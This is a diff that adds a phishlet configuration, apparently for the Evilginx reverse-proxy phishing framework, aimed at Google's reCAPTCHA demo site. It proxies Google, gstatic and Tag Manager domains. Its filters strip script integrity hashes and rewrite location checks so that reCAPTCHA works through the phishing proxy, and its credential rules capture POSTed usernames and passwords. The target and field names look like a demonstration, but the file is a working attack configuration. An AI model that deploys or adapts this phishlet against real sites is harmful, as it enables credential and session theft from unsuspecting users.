@@ -1,0 +1,32 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'recaptcha-demo.appspot.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'googletagmanager', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: "integrity[ \t]*=[ \t]*[\"']sha384-.{64}[\"']", replace: 'integrity=""', mimes: ['text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: '', domain: 'recaptcha-demo.appspot.com', search: "\\(window.location.href\\)", replace: '(window.location.href.replace("{hostname}", "{orig_hostname}"))', mimes: ['text/javascript']}
+
+# Adding manual filters for recaptcha-demo.appspot.com to avoid replacing the domain in the verification response view
+  - {triggers_on: 'recaptcha-demo.appspot.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript']}
+  - {triggers_on: 'recaptcha-demo.appspot.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript']}
+
+
+credentials:
+  username:
+    key: 'ex-a'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'ex-b'
+    search: '(.*)'
+    type: 'post'
+
+auth_tokens:
+  - domain: 'recaptcha-demo.appspot.com'
+    keys: []
+login:
+  domain: 'recaptcha-demo.appspot.com'
+  path: '/recaptcha-v2-checkbox.php'
